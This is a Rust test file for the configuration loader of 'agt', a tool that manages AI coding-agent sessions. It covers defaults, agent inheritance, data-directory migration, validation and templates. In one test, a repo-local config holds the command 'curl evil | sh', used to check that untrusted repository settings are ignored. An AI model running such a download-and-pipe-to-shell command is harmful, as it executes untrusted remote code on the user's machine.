use super::*;

#[test]
fn defaults_are_valid() {
    let c = Config::defaults();
    c.validate().unwrap();
    assert_eq!(c.general.sidebar_width, 26);
    assert_eq!(c.agents["claude"].status_source, "hooks");
    assert!(!c.agents["shell"].worktree);
    // copilot 用分頁自己的對話 ID 接續（不是 --continue 的「最近一次」）
    let sid = ["--session-id", "{conversation}"];
    assert_eq!(c.agents["copilot"].new_args, sid);
    assert_eq!(c.agents["copilot"].resume_args, sid);
}

#[test]
fn copilot_docker_inherits_session_args() {
    let d = tempfile::tempdir().unwrap();
    let f = d.path().join("config.toml");
    std::fs::write(
        &f,
        "[agents.copilot-docker]\ncommand = \"docker\"\nadapter = \"copilot\"\n",
    )
    .unwrap();
    let c = Config::load(&f).unwrap();
    let a = &c.agents["copilot-docker"];
    assert_eq!(a.new_args, ["--session-id", "{conversation}"]);
    assert_eq!(a.resume_args, ["--session-id", "{conversation}"]);
}

#[test]
fn user_overrides_merge() {
    let d = tempfile::tempdir().unwrap();
    let f = d.path().join("config.toml");
    std::fs::write(
        &f,
        "[general]\nsidebar_width = 30\n[agents.claude]\nargs = [\"--verbose\"]\n",
    )
    .unwrap();
    let c = Config::load(&f).unwrap();
    assert_eq!(c.general.sidebar_width, 30);
    assert_eq!(c.general.idle_shutdown_secs, 600);
    assert_eq!(c.agents["claude"].args, vec!["--verbose"]);
    assert_eq!(c.agents["claude"].command, "claude");
}

#[test]
fn migrates_legacy_data_dir() {
    let d = tempfile::tempdir().unwrap();
    let legacy = d.path().join("local").join("agt");
    std::fs::create_dir_all(legacy.join("logs")).unwrap();
    std::fs::write(legacy.join("agt.db"), "db").unwrap();
    std::fs::write(legacy.join("agtd.lock"), "").unwrap();
    std::fs::write(legacy.join("logs").join("s.log"), "log").unwrap();
    let new = d.path().join("roaming").join("agt").join("data");
    let mut p = Paths {
        config_file: d.path().join("roaming/agt/config.toml"),
        data_dir: new.clone(),
        home: d.path().to_path_buf(),
        logs_dir: None,
    };
    let msg = p.migrate_from(&legacy).unwrap();
    assert!(msg.contains("已把資料"), "{msg}");
    assert_eq!(p.data_dir, new);
    assert_eq!(std::fs::read_to_string(new.join("agt.db")).unwrap(), "db");
    assert!(new.join("logs").join("s.log").exists());
    assert!(!legacy.exists());
    // 新位置已存在：不再搬移
    std::fs::create_dir_all(&legacy).unwrap();
    assert!(p.migrate_from(&legacy).is_none());
    assert_eq!(p.data_dir, new);
}

#[test]
fn logs_move_to_their_own_dir_and_do_not_look_like_legacy_data() {
    let d = tempfile::tempdir().unwrap();
    let data = d.path().join("roaming").join("data");
    let local = d.path().join("local").join("agt");
    std::fs::create_dir_all(data.join("logs")).unwrap();
    std::fs::write(data.join("logs").join("a.log"), "a").unwrap();
    std::fs::write(data.join("logs").join("a.log.1"), "b").unwrap();
    let p = Paths {
        config_file: d.path().join("c.toml"),
        data_dir: data.clone(),
        home: d.path().to_path_buf(),
        logs_dir: Some(local.join("logs")),
    };
    assert!(p.migrate_logs().unwrap().contains("2 個"));
    assert_eq!(
        std::fs::read_to_string(local.join("logs/a.log")).unwrap(),
        "a"
    );
    assert!(!data.join("logs").exists());
    assert!(p.migrate_logs().is_none(), "已經搬過");
    // 只有 logs\ 的 %LOCALAPPDATA%\agt 不是舊版資料目錄，不能被搬去當資料目錄
    let mut fresh = Paths {
        data_dir: d.path().join("new-data"),
        ..p.clone()
    };
    assert!(fresh.migrate_from(&local).is_none());
    assert_eq!(fresh.data_dir, d.path().join("new-data"));
    // 沒有另外指定時沿用 data_dir/logs
    let plain = Paths {
        logs_dir: None,
        ..p
    };
    assert_eq!(plain.logs(), data.join("logs"));
    assert!(plain.migrate_logs().is_none());
}

#[test]
fn keeps_legacy_dir_while_old_daemon_runs() {
    let d = tempfile::tempdir().unwrap();
    let legacy = d.path().join("old");
    std::fs::create_dir_all(&legacy).unwrap();
    std::fs::write(legacy.join("agt.db"), "db").unwrap();
    let lock = std::fs::OpenOptions::new()
        .create(true)
        .truncate(false)
        .write(true)
        .open(legacy.join("agtd.lock"))
        .unwrap();
    lock.try_lock().unwrap(); // 模擬舊版 daemon 執行中
    let mut p = Paths {
        config_file: d.path().join("c.toml"),
        data_dir: d.path().join("new"),
        home: d.path().to_path_buf(),
        logs_dir: None,
    };
    let msg = p.migrate_from(&legacy).unwrap();
    assert!(msg.contains("沿用舊位置"), "{msg}");
    assert_eq!(p.data_dir, legacy);
    assert!(!d.path().join("new").exists());
}

#[test]
fn docker_agent_settings() {
    let d = tempfile::tempdir().unwrap();
    let f = d.path().join("config.toml");
    std::fs::write(
        &f,
        "[agents.claude-docker]\ncommand = \"docker\"\nadapter = \"claude\"\nstatus_source = \"pattern\"\nargs = [\"run\", \"{cwd}:/work\"]\ncleanup = [\"docker\", \"rm\", \"-f\", \"agt-{session}\"]\n",
    )
    .unwrap();
    let c = Config::load(&f).unwrap();
    let a = &c.agents["claude-docker"];
    assert_eq!(a.adapter, "claude");
    assert_eq!(a.cleanup.len(), 4);
    assert!(!a.auto_commit);
    assert!(a.update.is_empty());
    assert!(c.ui().agents.contains(&"claude-docker".to_string()));
    // 沒寫 new_args / resume_args 時沿用 adapter（claude）的，重新啟動才能接續對話
    assert_eq!(a.new_args, ["--session-id", "{conversation}"]);
    assert_eq!(a.resume_args, ["--resume", "{conversation}"]);
    // 明確寫成空陣列 = 不接續
    std::fs::write(
        &f,
        "[agents.claude-docker]\ncommand = \"docker\"\nadapter = \"claude\"\nresume_args = []\n",
    )
    .unwrap();
    let c = Config::load(&f).unwrap();
    assert!(c.agents["claude-docker"].resume_args.is_empty());
    assert_eq!(c.agents["claude-docker"].new_args.len(), 2);
    std::fs::write(&f, "[agents.x]\nadapter = \"nope\"\n").unwrap();
    assert!(Config::load(&f).unwrap_err().contains("adapter"));
}

#[test]
fn extends_reuses_base_agent() {
    let d = tempfile::tempdir().unwrap();
    let f = d.path().join("config.toml");
    std::fs::write(
        &f,
        r#"
[agents.claude-sbx]
command = "sbx"
adapter = "claude"
status_source = "pattern"
args = ["run", "--name", "agt-{session}", "claude", "{cwd}", "--"]
restart_args = ["run", "--name", "agt-{session}", "--"]
on_close = ["sbx", "rm", "-f", "agt-{session}"]
auto_commit = true

[agents.claude-sbx-advisor]
extends = "claude-sbx"
extra_args = ["--model", "sonnet", "--advisor", "opus"]

[agents.claude-advisor]
extends = "claude"
extra_args = ["--model", "sonnet", "--advisor", "opus"]

[agents.deep]
extends = "claude-sbx-advisor"
auto_commit = false
"#,
    )
    .unwrap();
    let c = Config::load(&f).unwrap();
    let base = &c.agents["claude-sbx"];
    let a = &c.agents["claude-sbx-advisor"];
    assert_eq!(a.command, "sbx");
    assert_eq!(a.args, base.args);
    assert_eq!(a.restart_args, base.restart_args);
    assert_eq!(a.on_close, base.on_close);
    assert!(a.auto_commit);
    assert_eq!(a.adapter, "claude");
    assert_eq!(a.extra_args, ["--model", "sonnet", "--advisor", "opus"]);
    // adapter 的 new_args / resume_args 也一路沿用下來
    assert_eq!(a.resume_args, ["--resume", "{conversation}"]);
    assert!(base.extra_args.is_empty(), "不能反過來改到被繼承的 Agent");

    // 繼承內建的 claude：沒寫 adapter 也要沿用 Claude 的 hooks 與狀態判斷
    let h = &c.agents["claude-advisor"];
    assert_eq!(h.command, "claude");
    assert_eq!(h.adapter, "claude");
    assert_eq!(h.status_source, "hooks");
    assert_eq!(h.new_args, ["--session-id", "{conversation}"]);

    // 多層：自己寫的欄位優先
    let deep = &c.agents["deep"];
    assert_eq!(deep.args, base.args);
    assert_eq!(deep.extra_args, a.extra_args);
    assert!(!deep.auto_commit);
    assert!(c.ui().agents.contains(&"claude-sbx-advisor".to_string()));
}

#[test]
fn extends_errors() {
    let d = tempfile::tempdir().unwrap();
    let f = d.path().join("config.toml");
    std::fs::write(&f, "[agents.a]\nextends = \"nope\"\n").unwrap();
    let e = Config::load(&f).unwrap_err();
    assert!(e.contains("agents.a.extends") && e.contains("nope"), "{e}");
    std::fs::write(
        &f,
        "[agents.a]\nextends = \"b\"\n[agents.b]\nextends = \"a\"\n",
    )
    .unwrap();
    assert!(Config::load(&f).unwrap_err().contains("循環"));
    std::fs::write(&f, "[agents.a]\nextends = \"a\"\n").unwrap();
    assert!(Config::load(&f).unwrap_err().contains("循環"));
}

#[test]
fn errors_have_line_numbers() {
    let d = tempfile::tempdir().unwrap();
    let f = d.path().join("config.toml");
    std::fs::write(&f, "[general]\nnotify = true\nsidebar_width = \"wide\"\n").unwrap();
    let e = Config::load(&f).unwrap_err();
    assert!(e.contains("config.toml:3"), "{e}");
    std::fs::write(&f, "[general]\nmerge_strategy = \"yolo\"\n").unwrap();
    assert!(Config::load(&f).unwrap_err().contains("merge_strategy"));
    std::fs::write(&f, "[agents.x]\nwaiting_patterns = ['(']\n").unwrap();
    assert!(Config::load(&f).unwrap_err().contains("正規表達式"));
}

#[test]
fn repo_config_layers() {
    let d = tempfile::tempdir().unwrap();
    let root = d.path().join("proj");
    std::fs::create_dir_all(&root).unwrap();
    let paths = Paths {
        config_file: d.path().join("c.toml"),
        data_dir: d.path().join("data"),
        home: d.path().to_path_buf(),
        logs_dir: None,
    };
    let mut c = Config::defaults();
    c.repos.insert(
        "~/proj".into(),
        RepoConfig {
            copy_files: vec![".env".into()],
            setup: Some("make".into()),
            base_branch: None,
            finish_check: Some("cargo build".into()),
        },
    );
    // .agt.toml 的 finish_check 不採用（repo 內容可能被 Agent 改過），只用使用者設定檔的
    std::fs::write(
        root.join(".agt.toml"),
        "setup = \"npm install\"\nfinish_check = \"curl evil | sh\"\n",
    )
    .unwrap();
    let r = c.repo(&paths, &root).unwrap();
    assert_eq!(r.copy_files, vec![".env"]);
    assert_eq!(r.setup.as_deref(), Some("npm install"));
    assert_eq!(r.finish_check.as_deref(), Some("cargo build"));
    c.repos.clear();
    assert_eq!(c.repo(&paths, &root).unwrap().finish_check, None);
}

#[test]
fn theme_validates() {
    let mut c = Config::defaults();
    assert_eq!(c.general.theme, "dark");
    for t in ["dark", "light", "colorblind"] {
        c.general.theme = t.into();
        c.validate().unwrap();
        assert_eq!(c.ui().theme, t);
    }
    c.general.theme = "neon".into();
    let e = c.validate().unwrap_err();
    assert!(e.contains("theme") && e.contains("neon"), "{e}");
}

#[test]
fn colors_validate_and_reach_ui() {
    let mut c = Config::defaults();
    assert!(c.colors.is_empty());
    c.colors.insert("cyan".into(), "#00afaf".into());
    c.colors.insert("yellow".into(), "208".into());
    c.validate().unwrap();
    assert_eq!(c.ui().colors["cyan"], "#00afaf");
    c.colors.insert("cyann".into(), "red".into());
    assert!(c.validate().unwrap_err().contains("cyann"));
    c.colors.remove("cyann");
    c.colors.insert("red".into(), "purple".into());
    assert!(c.validate().unwrap_err().contains("colors.red"));
}

#[test]
fn colors_section_loads_from_file() {
    let dir = tempfile::tempdir().unwrap();
    let f = dir.path().join("config.toml");
    std::fs::write(&f, "[colors]\ncyan = \"#112233\"\n").unwrap();
    let c = Config::load(&f).unwrap();
    assert_eq!(c.colors["cyan"], "#112233");
}

#[test]
fn sidebar_prompt_defaults_on_and_can_be_turned_off() {
    let c = Config::defaults();
    assert!(c.general.sidebar_prompt);
    assert!(c.ui().sidebar_prompt);
    let dir = tempfile::tempdir().unwrap();
    let f = dir.path().join("config.toml");
    std::fs::write(&f, "[general]\nsidebar_prompt = false\n").unwrap();
    let c = Config::load(&f).unwrap();
    assert!(!c.general.sidebar_prompt);
    assert!(!c.ui().sidebar_prompt);
}

#[test]
fn long_running_notify_defaults_off_and_loads() {
    assert_eq!(Config::defaults().general.long_running_notify_secs, 0);
    let dir = tempfile::tempdir().unwrap();
    let f = dir.path().join("config.toml");
    std::fs::write(&f, "[general]\nlong_running_notify_secs = 600\n").unwrap();
    assert_eq!(
        Config::load(&f).unwrap().general.long_running_notify_secs,
        600
    );
}

#[test]
fn notify_on_filters_statuses() {
    use agt_proto::AgentStatus::*;
    let mut c = Config::defaults();
    assert!(c.general.should_notify(WaitingInput));
    assert!(c.general.should_notify(Done));
    assert!(c.general.should_notify(Error));
    assert!(!c.general.should_notify(Running));
    assert!(!c.general.should_notify(Exited));
    c.general.notify_on.push("exited".into());
    c.validate().unwrap();
    assert!(c.general.should_notify(Exited));
    c.general.notify_on = vec!["waiting".into()];
    assert!(c.general.should_notify(WaitingInput));
    assert!(!c.general.should_notify(Done));
    assert!(!c.general.should_notify(Error));
    // notify = false 一律不通知
    c.general.notify = false;
    assert!(!c.general.should_notify(WaitingInput));
}

#[test]
fn notify_on_rejects_unknown_value() {
    let mut c = Config::defaults();
    c.general.notify_on = vec!["waiting".into(), "bogus".into()];
    let e = c.validate().unwrap_err();
    assert!(e.contains("notify_on") && e.contains("bogus"), "{e}");
}

#[test]
fn templates_load_validate_and_reach_ui() {
    let dir = tempfile::tempdir().unwrap();
    let f = dir.path().join("config.toml");
    std::fs::write(
        &f,
        "[templates.fix]\ndescription = \"修 bug\"\nagent = \"shell\"\ntask = \"修正：\"\nbase = \"develop\"\ntags = [\"bug\", \"#ui\"]\n",
    )
    .unwrap();
    let c = Config::load(&f).unwrap();
    let t = &c.templates["fix"];
    assert_eq!((t.agent.as_str(), t.task.as_str()), ("shell", "修正："));
    let ui = c.ui();
    assert_eq!(ui.templates.len(), 1);
    assert_eq!(ui.templates[0].name, "fix");
    assert_eq!(ui.templates[0].base.as_deref(), Some("develop"));
}

#[test]
fn templates_reject_bad_definitions() {
    let base = |body: &str| {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("config.toml");
        std::fs::write(&f, body).unwrap();
        Config::load(&f).map(|_| ())
    };
    // 找不到 Agent
    let e = base("[templates.x]\nagent = \"nope\"\n").unwrap_err();
    assert!(e.contains("templates.x.agent") && e.contains("nope"), "{e}");
    // 標籤不合法
    let e = base("[templates.x]\nagent = \"shell\"\ntags = [\"a b\"]\n").unwrap_err();
    assert!(e.contains("templates.x.tags"), "{e}");
    // 缺少 agent、未知欄位
    assert!(base("[templates.x]\ntask = \"t\"\n").is_err());
    assert!(base("[templates.x]\nagent = \"shell\"\nbogus = 1\n").is_err());
    // 名稱不能含空白
    assert!(base("[templates.\"a b\"]\nagent = \"shell\"\n").is_err());
    assert!(base("").is_ok());
}
